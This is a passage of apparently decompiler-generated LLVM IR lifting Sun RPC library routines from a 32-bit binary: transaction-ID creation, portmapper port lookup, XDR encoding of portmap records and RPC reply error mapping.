  %v3_8062ef1 = inttoptr i32 %v2_8062ef1 to i32*
  store i32 %v2_8062e84, i32* %v3_8062ef1, align 4
  %v2_8062ef2 = add i32 %v1_8062ef1, -8
  %v3_8062ef2 = inttoptr i32 %v2_8062ef2 to i32*
  store i32 %v2_8062e84, i32* %v3_8062ef2, align 4
  %v2_8062ef3 = add i32 %v1_8062ef1, -12
  %v3_8062ef3 = inttoptr i32 %v2_8062ef3 to i32*
  store i32 %v2_8062b69, i32* %v3_8062ef3, align 4
  %v0_8062ef4 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8062ef4 = add i32 %v1_8062ef1, -16
  %v3_8062ef4 = inttoptr i32 %v2_8062ef4 to i32*
  store i32 %v0_8062ef4, i32* %v3_8062ef4, align 4
  %v0_8062ef5 = load i32, i32* %stack_var_-20, align 4
  %v2_8062ef5 = call i32 @xdr_opaque_auth(i32 %v0_8062ef5, i32 %v0_80629e9)
  store i32 %v2_8062ef5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062f30

dec_label_pc_8062eff:                             ; preds = %dec_label_pc_8062e9d
  %tmp133 = icmp slt i32 %stack_var_-9020.0, 1
  br i1 %tmp133, label %dec_label_pc_8062f30, label %dec_label_pc_8062f08

dec_label_pc_8062f08:                             ; preds = %dec_label_pc_8062eff
  store i32 %tmp111, i32* @ebx, align 4
  %v2_8062f0e = load i32, i32* %arg1, align 4
  store i32 %v2_8062f0e, i32* %eax.global-to-local, align 4
  %v1_8062f10 = add i32 %v2_8062f0e, 32
  %v2_8062f10 = inttoptr i32 %v1_8062f10 to i32*
  %v3_8062f10 = load i32, i32* %v2_8062f10, align 4
  store i32 %v3_8062f10, i32* %edx.global-to-local, align 4
  %v3_8062f13 = inttoptr i32 %v0_8062ea9 to i32*
  store i32 %v2_8062f0e, i32* %v3_8062f13, align 4
  %v1_8062f14 = add i32 %v0_8062ea9, -4
  %v2_8062f14 = inttoptr i32 %v1_8062f14 to i32*
  store i32 134622999, i32* %v2_8062f14, align 4
  %v3_8062f14 = load i32, i32* %edx.global-to-local, align 4
  %v4_8062f14 = add i32 %v3_8062f14, 12
  %v5_8062f14 = inttoptr i32 %v4_8062f14 to i32*
  %v6_8062f14 = load i32, i32* %v5_8062f14, align 4
  call void @__pseudo_call(i32 %v6_8062f14)
  %v1_8062f1a = icmp eq i32 %v2_8062f0e, 0
  br i1 %v1_8062f1a, label %dec_label_pc_8062f30, label %dec_label_pc_8062f1e

dec_label_pc_8062f1e:                             ; preds = %dec_label_pc_8062f08
  %v0_8062f17 = load i32, i32* @esp, align 4
  %v1_8062f17 = add i32 %v0_8062f17, 16
  %v4_8062f1e = add i32 %stack_var_-9020.0, -1
  %v0_8062a84.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8062a84

dec_label_pc_8062f29:                             ; preds = %dec_label_pc_8062e76
  %v2_8062f29 = inttoptr i32 %v1_8062f29 to i32*
  store i32 2, i32* %v2_8062f29, align 4
  br label %dec_label_pc_8062f30

dec_label_pc_8062f30:                             ; preds = %dec_label_pc_8062f08, %dec_label_pc_8062eff, %dec_label_pc_8062edc, %dec_label_pc_8062ee5, %dec_label_pc_8062f29
  %v0_8062f30 = load i32, i32* @esi, align 4
  %v1_8062f30 = add i32 %v0_8062f30, 44
  %v2_8062f30 = inttoptr i32 %v1_8062f30 to i32*
  %v3_8062f30 = load i32, i32* %v2_8062f30, align 4
  store i32 %v3_8062f30, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062f33

dec_label_pc_8062f33:                             ; preds = %dec_label_pc_8062e48, %dec_label_pc_8062cb7, %dec_label_pc_8062a27, %dec_label_pc_8062aff, %dec_label_pc_8062f30
  %v0_8062f3a = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8062f3a

; uselistorder directives
  uselistorder i32 %v2_8062ebb, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8062ea9, { 5, 6, 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_8062e92, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8062e2b, { 1, 2, 0 }
  uselistorder i32 %v1_8062e22, { 1, 0 }
  uselistorder i32 %v6_8062e1d, { 2, 4, 3, 5, 1, 0 }
  uselistorder i32 %v1_8062e04, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8062df5, { 0, 2, 3, 1 }
  uselistorder i32 %v0_8062a42, { 1, 2, 0 }
  uselistorder i32 %v1_8062deb, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8062d76, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8062d5e, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_8062d59, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8062d02, { 0, 3, 2, 1, 4 }
  uselistorder i32 %storemerge7.in.lcssa, { 1, 2, 0 }
  uselistorder i32 %v4_8062c85, { 1, 0 }
  uselistorder i32 %v4_8062c7b, { 0, 2, 1 }
  uselistorder i32 %v1_8062c32, { 2, 1, 0 }
  uselistorder i32 %v3_8062c2d, { 1, 2, 0 }
  uselistorder i32 %stack_var_-9016.3161, { 5, 6, 7, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8062bc6, { 2, 3, 4, 5, 6, 1, 0 }
  uselistorder i32 %v0_8062baf, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_8062baa, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8062b9d, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-9028.2, { 2, 3, 5, 4, 1, 0 }
  uselistorder i32 %stack_var_-9008.2, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v1_8062b6f, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-9028.1, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8062b29, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8062ae3, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v2_8062ad2, { 2, 0, 1, 4, 3, 5 }
  uselistorder i32 %v0_8062ac8, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_8062a84, { 1, 0, 2, 4, 5, 6, 7, 8, 3, 9 }
  uselistorder i32 %stack_var_-9020.0, { 2, 0, 3, 1 }
  uselistorder i32 %stack_var_-9008.0, { 1, 0 }
  uselistorder i32 %stack_var_-9004.0, { 1, 0 }
  uselistorder i32 %stack_var_-9012.0, { 1, 0 }
  uselistorder i32 %stack_var_-9016.0, { 1, 0 }
  uselistorder i32 %v0_8062a97, { 1, 0 }
  uselistorder i32 %v2_8062e84, { 2, 3, 4, 5, 6, 1, 0 }
  uselistorder i32 %v2_8062d1e, { 2, 3, 4, 5, 0, 1 }
  uselistorder i1 %v4_8062a8d, { 1, 0 }
  uselistorder i32 %storemerge3, { 0, 4, 3, 2, 1 }
  uselistorder i32 %stack_var_-9000.0, { 1, 0, 2 }
  uselistorder i32 %v3_8062a0d, { 2, 1, 0 }
  uselistorder i32 %v2_8062a05, { 1, 2, 0, 3 }
  uselistorder i32 %v0_80629e9, { 2, 3, 1, 0 }
  uselistorder i32 %v0_80629e8, { 1, 0 }
  uselistorder i32 %v0_80629e7, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i16* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %tmp111, { 5, 0, 4, 3, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 54, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 40, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 45, 49, 50, 51, 52, 53, 55, 56, 57, 58, 59, 60, 61, 18, 46, 47, 48, 63, 62, 64, 65 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 92, { 2, 6, 4, 5, 0, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_recvmsg, { 1, 0 }
  uselistorder i32 8192, { 4, 5, 6, 7, 0, 1, 2, 3, 8 }
  uselistorder i32 8800, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 1, 0 }
  uselistorder i32 -28, { 6, 7, 3, 2, 1, 4, 8, 31, 0, 9, 5, 10, 11, 12, 17, 16, 15, 13, 14, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32 -24, { 7, 8, 32, 31, 2, 1, 0, 3, 9, 4, 10, 11, 12, 17, 16, 15, 13, 14, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 5, 6, 28, 29, 30 }
  uselistorder i64 1000, { 1, 0, 2 }
  uselistorder i32 1000, { 0, 1, 5, 2, 4, 3 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8062f33, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8062f30, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8062edc, { 1, 0 }
  uselistorder label %dec_label_pc_8062e48, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8062e3f, { 1, 0 }
  uselistorder label %dec_label_pc_8062e01, { 9, 8, 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8062ddb, { 1, 0 }
  uselistorder label %dec_label_pc_8062c75, { 1, 0 }
  uselistorder label %dec_label_pc_8062c0c, { 1, 0 }
  uselistorder label %dec_label_pc_8062b9d, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8062a5c, { 1, 0 }
}

define i32 @_create_xid() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_8062f4a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8062f4a, i32* @ebx, align 4
  %v4_8062f4f = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134583465, i32 ptrtoint (i32* @global_var_807c9c8.854 to i32))
  %v1_8062f5b = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807c9c8.854 to i32))
  %v0_8062f63 = load i8, i8* @global_var_807c9e0.855, align 32
  %v1_8062f63 = icmp eq i8 %v0_8062f63, 0
  %v1_8062f6a = icmp eq i1 %v1_8062f63, false
  br i1 %v1_8062f6a, label %dec_label_pc_8062f99, label %dec_label_pc_8062f6c

dec_label_pc_8062f6c:                             ; preds = %entry
  %v0_8062f6c = load i32, i32* @ecx, align 4
  %v2_8062f70 = ptrtoint i32* %stack_var_-16 to i32
  %v4_8062f75 = call i32 @gettimeofday(i32 %v2_8062f70, i32 0, i32 %v0_8062f6c, i32 %v0_8062f6c)
  %v4_8062f85 = load i32, i32* %stack_var_-16, align 4
  %v5_8062f85 = xor i32 %v4_8062f85, %tmp
  %v2_8062f8a = trunc i32 %v5_8062f85 to i16
  %v3_8062f8a = call i32 @__GI_srand48_r(i16 %v2_8062f8a, i32 ptrtoint (i32* @global_var_807c9e4.856 to i32))
  store i8 1, i8* @global_var_807c9e0.855, align 32
  br label %dec_label_pc_8062f99

dec_label_pc_8062f99:                             ; preds = %entry, %dec_label_pc_8062f6c
  %v2_8062f99 = ptrtoint i32* %stack_var_-8 to i32
  %v0_8062f9d = load i32, i32* @ecx, align 4
  %v4_8062fa5 = call i32 @lrand48_r(i32 ptrtoint (i32* @global_var_807c9e4.856 to i32), i32 %v2_8062f99, i32 %v0_8062f9d, i32 %v0_8062f9d)
  %v3_8062faf = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v3_8062fb4 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v3_8062fb4

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_807c9e4.856 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @gettimeofday, { 0, 2, 1 }
  uselistorder i8* @global_var_807c9e0.855, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_807c9c8.854 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_8062f99, { 1, 0 }
}

define i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-14 = alloca i16, align 2
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8062fc0 = load i32, i32* @edi, align 4
  %v0_8062fc2 = load i32, i32* @ebx, align 4
  store i32 %v0_8062fc2, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  store i16 0, i16* %stack_var_-14, align 2
  store i32 -1, i32* %stack_var_-20, align 4
  %v1_8062fd9 = add i32 %arg1, 2
  %v2_8062fd9 = inttoptr i32 %v1_8062fd9 to i16*
  store i16 28416, i16* %v2_8062fd9, align 2
  %v2_8062fe9 = ptrtoint i32* %stack_var_-20 to i32
  %v0_8063001 = load i32, i32* @edi, align 4
  %v9_8063002 = call i32 @__GI_clntudp_bufcreate(i32 %v0_8063001, i32 100000, i32 2, i32 5, i32* null, i32 %v2_8062fe9, i32 400, i32 400)
  store i32 %v9_8063002, i32* @ebx, align 4
  %v1_806300c = icmp eq i32 %v9_8063002, 0
  br i1 %v1_806300c, label %dec_label_pc_806309d, label %dec_label_pc_8063090

dec_label_pc_8063090:                             ; preds = %entry
  %v0_8063014 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_8063014, i32* %esi.global-to-local, align 4
  %v0_8063043 = load i32, i32* @ebx, align 4
  %v1_8063043 = add i32 %v0_8063043, 4
  %v2_8063043 = inttoptr i32 %v1_8063043 to i32*
  %v3_8063043 = load i32, i32* %v2_8063043, align 4
  store i32 %v3_8063043, i32* @ecx, align 4
  %v5_8063061 = inttoptr i32 %v3_8063043 to i32*
  %v6_8063061 = load i32, i32* %v5_8063061, align 4
  call void @__pseudo_call(i32 %v6_8063061)
  %v0_806306a = load i32, i32* %esi.global-to-local, align 4
  %v1_806306a = inttoptr i32 %v0_806306a to i32*
  store i32 14, i32* %v1_806306a, align 4
  %v0_8063075 = load i32, i32* @ebx, align 4
  %v1_8063075 = add i32 %v0_8063075, 4
  %v2_8063075 = inttoptr i32 %v1_8063075 to i32*
  %v3_8063075 = load i32, i32* %v2_8063075, align 4
  %v5_806307a = add i32 %v3_8063075, 8
  %v6_806307a = inttoptr i32 %v5_806307a to i32*
  %v7_806307a = load i32, i32* %v6_806307a, align 4
  call void @__pseudo_call(i32 %v7_806307a)
  %v0_8063093 = load i32, i32* @ebx, align 4
  %v1_8063093 = add i32 %v0_8063093, 4
  %v2_8063093 = inttoptr i32 %v1_8063093 to i32*
  %v3_8063093 = load i32, i32* %v2_8063093, align 4
  %v5_8063097 = add i32 %v3_8063093, 16
  %v6_8063097 = inttoptr i32 %v5_8063097 to i32*
  %v7_8063097 = load i32, i32* %v6_8063097, align 4
  call void @__pseudo_call(i32 %v7_8063097)
  br label %dec_label_pc_806309d

dec_label_pc_806309d:                             ; preds = %entry, %dec_label_pc_8063090
  %v0_806309d = load i32, i32* @edi, align 4
  %v1_806309d = add i32 %v0_806309d, 2
  %v2_806309d = inttoptr i32 %v1_806309d to i16*
  store i16 0, i16* %v2_806309d, align 2
  %v3_80630a3 = load i16, i16* %stack_var_-14, align 2
  %v4_80630a3 = sext i16 %v3_80630a3 to i32
  %v2_80630ab = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80630ab, i32* @ebx, align 4
  store i32 %v0_8062fc0, i32* @edi, align 4
  ret i32 %v4_80630a3

; uselistorder directives
  uselistorder i32 %v9_8063002, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i16* %stack_var_-14, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_806309d, { 1, 0 }
}

define i32 @__GI_xdr_pmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %v0_80630b0 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v2_80630bf = inttoptr i32 %arg1 to i32*
  %v3_80630bf = call i32 @xdr_u_long(i32* %v2_80630bf, i32 %arg2)
  %v1_80630c7 = icmp eq i32 %v3_80630bf, 0
  br i1 %v1_80630c7, label %dec_label_pc_8063104, label %dec_label_pc_80630cb

dec_label_pc_80630cb:                             ; preds = %entry
  %v0_80630cd = load i32, i32* @ebx, align 4
  %v1_80630cd = add i32 %v0_80630cd, 4
  store i32 %v1_80630cd, i32* @eax, align 4
  %v0_80630d1 = load i32, i32* %esi.global-to-local, align 4
  %v2_80630d2 = inttoptr i32 %v0_80630d1 to i32*
  %v3_80630d2 = call i32 @xdr_u_long(i32* %v2_80630d2, i32 %v1_80630cd)
  %v1_80630da = icmp eq i32 %v3_80630d2, 0
  br i1 %v1_80630da, label %dec_label_pc_8063104, label %dec_label_pc_80630de

dec_label_pc_80630de:                             ; preds = %dec_label_pc_80630cb
  %v0_80630e0 = load i32, i32* @ebx, align 4
  %v1_80630e0 = add i32 %v0_80630e0, 8
  store i32 %v1_80630e0, i32* @eax, align 4
  %v0_80630e4 = load i32, i32* %esi.global-to-local, align 4
  %v2_80630e5 = inttoptr i32 %v0_80630e4 to i32*
  %v3_80630e5 = call i32 @xdr_u_long(i32* %v2_80630e5, i32 %v1_80630e0)
  %v1_80630ed = icmp eq i32 %v3_80630e5, 0
  br i1 %v1_80630ed, label %dec_label_pc_8063104, label %dec_label_pc_80630f1

dec_label_pc_80630f1:                             ; preds = %dec_label_pc_80630de
  %v0_80630f1 = load i32, i32* @ebx, align 4
  %v1_80630f1 = add i32 %v0_80630f1, 12
  store i32 %v1_80630f1, i32* @eax, align 4
  %v0_80630f4 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_80630b0, i32* %esi.global-to-local, align 4
  %v2_80630ff = inttoptr i32 %v0_80630f4 to i32*
  %v3_80630ff = call i32 @xdr_u_long(i32* %v2_80630ff, i32 %v1_80630f1)
  br label %dec_label_pc_8063104

dec_label_pc_8063104:                             ; preds = %dec_label_pc_80630de, %dec_label_pc_80630cb, %entry, %dec_label_pc_80630f1
  store i32 %v0_80630b0, i32* %esi.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_80630b0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8063104, { 3, 0, 1, 2 }
}

define i32 @__GI__seterr_reply() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* %ecx.global-to-local, align 4
  store i32 %tmp, i32* %edx.global-to-local, align 4
  %v1_8063114 = add i32 %tmp2, 8
  %v2_8063114 = inttoptr i32 %v1_8063114 to i32*
  %v3_8063114 = load i32, i32* %v2_8063114, align 4
  store i32 %v3_8063114, i32* %eax.global-to-local, align 4
  %v1_8063117 = icmp eq i32 %v3_8063114, 0
  br i1 %v1_8063117, label %dec_label_pc_8063124, label %dec_label_pc_806311b

dec_label_pc_806311b:                             ; preds = %entry
  %v1_806311b = add i32 %v3_8063114, -1
  %v8_806311b = icmp eq i32 %v1_806311b, 0
  store i32 %v1_806311b, i32* %eax.global-to-local, align 4
  %v1_806311c = icmp eq i1 %v8_806311b, false
  br i1 %v1_806311c, label %dec_label_pc_80631ac, label %dec_label_pc_806317d

dec_label_pc_8063124:                             ; preds = %entry
  %v1_8063124 = add i32 %tmp2, 24
  %v2_8063124 = inttoptr i32 %v1_8063124 to i32*
  %v3_8063124 = load i32, i32* %v2_8063124, align 4
  store i32 %v3_8063124, i32* %eax.global-to-local, align 4
  %v1_8063127 = icmp eq i32 %v3_8063124, 0
  %v1_8063129 = icmp eq i1 %v1_8063127, false
  br i1 %v1_8063129, label %dec_label_pc_8063132, label %dec_label_pc_806312b

dec_label_pc_806312b:                             ; preds = %dec_label_pc_8063124
  %v1_806312b = inttoptr i32 %tmp to i32*
  store i32 0, i32* %v1_806312b, align 4
  %v0_8063131 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8063131

dec_label_pc_8063132:                             ; preds = %dec_label_pc_8063124
  switch i32 %tmp2, label %dec_label_pc_806316e [
    i32 0, label %dec_label_pc_8063166
    i32 1, label %dec_label_pc_806313e
    i32 2, label %dec_label_pc_8063146
    i32 3, label %dec_label_pc_806314e
    i32 4, label %dec_label_pc_8063156
    i32 5, label %dec_label_pc_806315e
  ]

dec_label_pc_806313e:                             ; preds = %dec_label_pc_8063132
  %v1_806313e = inttoptr i32 %tmp to i32*
  store i32 8, i32* %v1_806313e, align 4
  br label %dec_label_pc_80631b8

dec_label_pc_8063146:                             ; preds = %dec_label_pc_8063132
  %v1_8063146 = inttoptr i32 %tmp to i32*
  store i32 9, i32* %v1_8063146, align 4
  br label %dec_label_pc_80631b8

dec_label_pc_806314e:                             ; preds = %dec_label_pc_8063132
  %v1_806314e = inttoptr i32 %tmp to i32*
  store i32 10, i32* %v1_806314e, align 4
  br label %dec_label_pc_80631b8

dec_label_pc_8063156:                             ; preds = %dec_label_pc_8063132
  %v1_8063156 = inttoptr i32 %tmp to i32*
  store i32 11, i32* %v1_8063156, align 4
  br label %dec_label_pc_80631b8

dec_label_pc_806315e:                             ; preds = %dec_label_pc_8063132
  %v1_806315e = inttoptr i32 %tmp to i32*
  store i32 12, i32* %v1_806315e, align 4
  br label %dec_label_pc_80631b8

dec_label_pc_8063166:                             ; preds = %dec_label_pc_8063132
  %v1_8063166 = inttoptr i32 %tmp to i32*
  store i32 0, i32* %v1_8063166, align 4
  br label %dec_label_pc_80631b8

dec_label_pc_806316e:                             ; preds = %dec_label_pc_8063132
  %v1_806316e = inttoptr i32 %tmp to i32*
  store i32 16, i32* %v1_806316e, align 4
  %v0_8063174 = load i32, i32* %edx.global-to-local, align 4
  %v1_8063174 = add i32 %v0_8063174, 4
  %v2_8063174 = inttoptr i32 %v1_8063174 to i32*
  store i32 0, i32* %v2_8063174, align 4
  br label %dec_label_pc_80631a7

dec_label_pc_806317d:                             ; preds = %dec_label_pc_806311b
  %v1_806317d = add i32 %tmp2, 12
  %v2_806317d = inttoptr i32 %v1_806317d to i32*
  %v3_806317d = load i32, i32* %v2_806317d, align 4
  store i32 %v3_806317d, i32* %eax.global-to-local, align 4
  %v9_8063180 = icmp eq i32 %v3_806317d, 1
  br i1 %v9_8063180, label %dec_label_pc_8063192, label %dec_label_pc_8063185

dec_label_pc_8063185:                             ; preds = %dec_label_pc_806317d
  %v9_8063185 = icmp eq i32 %v3_806317d, 6
  %v1_8063188 = icmp eq i1 %v9_8063185, false
  %v1_806319a = inttoptr i32 %tmp to i32*
  br i1 %v1_8063188, label %dec_label_pc_806319a, label %dec_label_pc_806318a

dec_label_pc_806318a:                             ; preds = %dec_label_pc_8063185
  store i32 6, i32* %v1_806319a, align 4
  br label %dec_label_pc_80631b8

dec_label_pc_8063192:                             ; preds = %dec_label_pc_806317d
  %v1_8063192 = inttoptr i32 %tmp to i32*
  store i32 7, i32* %v1_8063192, align 4
  br label %dec_label_pc_80631b8

dec_label_pc_806319a:                             ; preds = %dec_label_pc_8063185
  store i32 16, i32* %v1_806319a, align 4
  %v0_80631a0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80631a0 = add i32 %v0_80631a0, 4
  %v2_80631a0 = inttoptr i32 %v1_80631a0 to i32*
  store i32 1, i32* %v2_80631a0, align 4
  br label %dec_label_pc_80631a7

dec_label_pc_80631a7:                             ; preds = %dec_label_pc_806316e, %dec_label_pc_806319a
  %v0_80631a7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80631a7 = load i32, i32* %edx.global-to-local, align 4
  %v2_80631a7 = add i32 %v1_80631a7, 8
  %v3_80631a7 = inttoptr i32 %v2_80631a7 to i32*
  store i32 %v0_80631a7, i32* %v3_80631a7, align 4
  br label %dec_label_pc_80631b8

dec_label_pc_80631ac:                             ; preds = %dec_label_pc_806311b
  %v1_80631ac = inttoptr i32 %tmp to i32*
  store i32 16, i32* %v1_80631ac, align 4
  %v0_80631b2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80631b2 = add i32 %v0_80631b2, 8
  %v2_80631b2 = inttoptr i32 %v1_80631b2 to i32*
  %v3_80631b2 = load i32, i32* %v2_80631b2, align 4
  store i32 %v3_80631b2, i32* %eax.global-to-local, align 4
  %v1_80631b5 = load i32, i32* %edx.global-to-local, align 4
  %v2_80631b5 = add i32 %v1_80631b5, 4
  %v3_80631b5 = inttoptr i32 %v2_80631b5 to i32*
  store i32 %v3_80631b2, i32* %v3_80631b5, align 4
  br label %dec_label_pc_80631b8

dec_label_pc_80631b8:                             ; preds = %dec_label_pc_8063166, %dec_label_pc_806315e, %dec_label_pc_8063156, %dec_label_pc_806314e, %dec_label_pc_8063146, %dec_label_pc_806313e, %dec_label_pc_80631a7, %dec_label_pc_8063192, %dec_label_pc_806318a, %dec_label_pc_80631ac
  %v0_80631b8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80631b8 = inttoptr i32 %v0_80631b8 to i32*
  %v2_80631b8 = load i32, i32* %v1_80631b8, align 4
  store i32 %v2_80631b8, i32* %eax.global-to-local, align 4
  %v9_80631ba = icmp eq i32 %v2_80631b8, 7
  br i1 %v9_80631ba, label %dec_label_pc_80631d6, label %dec_label_pc_80631bf

dec_label_pc_80631bf:                             ; preds = %dec_label_pc_80631b8
  %v9_80631bf = icmp eq i32 %v2_80631b8, 9
  br i1 %v9_80631bf, label %dec_label_pc_80631dd, label %dec_label_pc_80631c4

dec_label_pc_80631c4:                             ; preds = %dec_label_pc_80631bf
  %v9_80631c4 = icmp eq i32 %v2_80631b8, 6
  %v1_80631c7 = icmp eq i1 %v9_80631c4, false
  br i1 %v1_80631c7, label %dec_label_pc_80631e9, label %dec_label_pc_80631c9

dec_label_pc_80631c9:                             ; preds = %dec_label_pc_80631c4
  %v0_80631c9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80631c9 = add i32 %v0_80631c9, 16
  %v2_80631c9 = inttoptr i32 %v1_80631c9 to i32*
  %v3_80631c9 = load i32, i32* %v2_80631c9, align 4
  store i32 %v3_80631c9, i32* %eax.global-to-local, align 4
  %v2_80631cc = add i32 %v0_80631b8, 4
  %v3_80631cc = inttoptr i32 %v2_80631cc to i32*
  store i32 %v3_80631c9, i32* %v3_80631cc, align 4
  %v0_80631cf = load i32, i32* %ecx.global-to-local, align 4
  %v1_80631cf = add i32 %v0_80631cf, 20
  %v2_80631cf = inttoptr i32 %v1_80631cf to i32*
  %v3_80631cf = load i32, i32* %v2_80631cf, align 4
  store i32 %v3_80631cf, i32* %eax.global-to-local, align 4
  %v1_80631d2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80631d2 = add i32 %v1_80631d2, 8
  %v3_80631d2 = inttoptr i32 %v2_80631d2 to i32*
  store i32 %v3_80631cf, i32* %v3_80631d2, align 4
  ret i32 %v3_80631cf

dec_label_pc_80631d6:                             ; preds = %dec_label_pc_80631b8
  %v0_80631d6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80631d6 = add i32 %v0_80631d6, 16
  %v2_80631d6 = inttoptr i32 %v1_80631d6 to i32*
  %v3_80631d6 = load i32, i32* %v2_80631d6, align 4
  store i32 %v3_80631d6, i32* %eax.global-to-local, align 4
  %v2_80631d9 = add i32 %v0_80631b8, 4
  %v3_80631d9 = inttoptr i32 %v2_80631d9 to i32*
  store i32 %v3_80631d6, i32* %v3_80631d9, align 4
  ret i32 %v3_80631d6

dec_label_pc_80631dd:                             ; preds = %dec_label_pc_80631bf
  %v0_80631dd = load i32, i32* %ecx.global-to-local, align 4
  %v1_80631dd = add i32 %v0_80631dd, 28
  %v2_80631dd = inttoptr i32 %v1_80631dd to i32*
  %v3_80631dd = load i32, i32* %v2_80631dd, align 4
  store i32 %v3_80631dd, i32* %eax.global-to-local, align 4
  %v2_80631e0 = add i32 %v0_80631b8, 4
  %v3_80631e0 = inttoptr i32 %v2_80631e0 to i32*
  store i32 %v3_80631dd, i32* %v3_80631e0, align 4
  %v0_80631e3 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80631e3 = add i32 %v0_80631e3, 32
  %v2_80631e3 = inttoptr i32 %v1_80631e3 to i32*
  %v3_80631e3 = load i32, i32* %v2_80631e3, align 4
  store i32 %v3_80631e3, i32* %eax.global-to-local, align 4
  %v1_80631e6 = load i32, i32* %edx.global-to-local, align 4
  %v2_80631e6 = add i32 %v1_80631e6, 8
  %v3_80631e6 = inttoptr i32 %v2_80631e6 to i32*
  store i32 %v3_80631e3, i32* %v3_80631e6, align 4
  %v0_80631e9.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80631e9

dec_label_pc_80631e9:                             ; preds = %dec_label_pc_80631c4, %dec_label_pc_80631dd
  %v0_80631e9 = phi i32 [ %v2_80631b8, %dec_label_pc_80631c4 ], [ %v0_80631e9.pre, %dec_label_pc_80631dd ]
  ret i32 %v0_80631e9

; uselistorder directives
  uselistorder i32 %v2_80631b8, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_80631b8, { 1, 0, 2, 3 }
  uselistorder i32* %v1_806319a, { 1, 0 }
